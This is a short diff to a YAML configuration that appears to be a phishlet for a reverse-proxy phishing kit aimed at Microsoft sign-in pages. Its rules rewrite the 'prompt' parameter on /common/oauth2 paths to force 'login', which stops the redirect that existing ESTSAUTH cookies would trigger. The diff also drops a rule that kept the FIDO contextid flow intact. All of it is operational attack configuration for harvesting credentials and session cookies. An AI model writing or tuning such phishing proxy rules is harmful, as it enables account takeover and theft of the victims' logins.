@@ -124,7 +124,6 @@ force_post:
     force:
       - { key: "DontShowAgain", value: "true" }
     type: "post"
-  # Force prompt=login to prevent auto-redirect from existing ESTSAUTH cookies
   - path: "/common/oauth2/*"
     search:
       - { key: "prompt", search: ".*" }
@@ -136,12 +135,6 @@ force_post:
       - { key: "prompt", search: ".*" }
     force:
       - { key: "prompt", value: "login" }
-    type: "post"
-  # CRITICAL: Preserve contextid for FIDO authentication flow
-  - path: "/consumers/fido/*"
-    search:
-      - { key: "contextid", search: ".*" }
-    force: []
     type: "post"
 
 auth_urls:
